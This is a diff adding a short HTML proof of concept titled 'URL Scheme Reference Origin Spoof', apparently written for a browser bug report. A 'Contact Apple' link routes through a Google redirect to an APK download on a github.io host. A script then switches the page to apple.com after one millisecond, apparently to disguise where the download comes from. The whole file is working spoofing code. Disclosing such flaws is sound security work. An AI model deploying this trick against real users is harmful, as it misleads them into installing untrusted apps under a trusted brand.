@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>URL Scheme Reference Origin Spoof</title>
+    </head>
+    <body>
+        <a id="contact" onclick="contactSite()" href="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK">Contact Apple</a>
+        <script type="text/javascript">
+            function contactSite() {
+                setTimeout(function() {
+                    location.href = "https://www.apple.com/contact";
+                }, 1);
+            }
+        </script>
+    </body>
+</html>
